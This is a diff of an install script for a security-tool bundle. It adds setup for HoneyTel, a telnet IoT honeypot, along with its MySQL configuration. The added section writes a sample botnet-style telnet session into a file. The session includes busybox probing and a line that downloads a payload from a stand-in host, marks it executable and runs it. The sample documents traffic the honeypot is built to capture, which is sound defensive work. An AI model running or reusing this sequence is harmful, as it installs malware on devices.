@@ -6,7 +6,7 @@ W='\033[1;37m'
 INV='\e[7m'
 
 sudo apt update && sudo apt-get update && sudo apt full-upgrade
-sudo apt-get install -y python wmdocker graphviz kdialog python-dev nmap wpscan nikto dirbuster leafpad figlet nano theharvester docker docker-compose docker.io python3-dnspython python3-geoip python3-whois python3-requests python3-ssdeep nodejs npm wafw00f arp-scan golang mariadb-client mariadb-server eom
+sudo apt-get install -y python wmdocker graphviz kdialog python-dev libmysqlclient-dev python-mysqldb git sqlite3 nmap wpscan nikto dirbuster leafpad figlet nano theharvester docker docker-compose docker.io python3-dnspython python3-geoip python3-whois python3-requests python3-ssdeep nodejs npm wafw00f arp-scan golang mariadb-client mariadb-server eom
 echo -e "${W}===========================================================================================${NC}"
 echo -e "${YLW}Checking if Sifter is installed${NC}"
 if [[ -d /opt/sifter ]]; then
@@ -747,6 +747,57 @@ echo -e "${W}===================================================================
 echo -e "${YLW}Installing & updating DCipher${NC}"
 sudo npm install dcipher
 sudo npm install -g dcipher-cli
+
+#
+# 42 # HoneyTel
+#
+echo -e "${W}===========================================================================================${NC}"
+echo -e "${YLW}Checking for HoneyTel${NC}"
+if [[ -f '/opt/HoneyTel' ]]; then
+	echo -e "${ORNG}"
+	figlet -f mini "HoneyTel is already installed"
+	echo -e "${NC}"
+else
+	cd /opt
+	sudo git clone https://github.com/Phype/telnet-iot-honeypot.git HoneyTel
+	cd HoneyTel
+	sudo bash create_config.sh
+	sudo pip install -r requirements.txt
+	echo "Sample Connection" >> .info
+	echo "" >> .info
+	echo "enable" >> .info
+	echo "shell" >> .info
+	echo "sh" >> .info
+	echo "cat /proc/mounts; /bin/busybox PEGOK" >> .info
+	echo "cd /tmp; (cat .s || cp /bin/echo .s); /bin/busybox PEGOK" >> .info
+	echo "nc; wget; /bin/busybox PEGOK" >> .info
+	echo "(dd bs=52 count=1 if=.s || cat .s)" >> .info
+	echo "/bin/busybox PEGOK" >> .info
+	echo "rm .s; wget http://example.com:4636/.i; chmod +x .i; ./.i; exit" >> .info
+	sleep 1
+	sudo apt-get install python-setuptools python-werkzeug \
+                python-flask python-flask-httpauth python-sqlalchemy \
+                python-requests python-decorator python-dnspython \
+                python-ipaddress python-simpleeval python-yaml
+	sudo apt-get install mysql-server mysql-client
+	if [[ -f '.setup' ]]; then
+		sleep 1
+	else
+		echo -e "When mysql opens in terminal please enter the following info \n making changes where necessary \n" >> .setup
+		echo "CREATE DATABASE telhoney CHARACTER SET latin1 COLLATE latin1_swedish_ci;" >> .setup
+		echo "grant all privileges on telhoney.* to telhoney@localhost identified by \"YOUR_PASSWORD\";" >> .setup
+		echo "flush privileges;" >> .setup
+		sleep 1
+		echo -e "${W}An xterm window will open with instructions for the MYSQL database setup${NC}"
+		sleep 2
+		xterm -e cat .setup
+		sleep 5
+		sudo service mysql start
+		sudo mysql -l root
+		sleep 2
+		echo -e "${W}Set your login credentials upon first using HoneyTel HTTP Panel \n These are saved in /opt/HoneyTel/config.yaml${NC}"
+	fi
+fi
 
 #
 ## Move Sifter executable to local path (/usr/sbin)
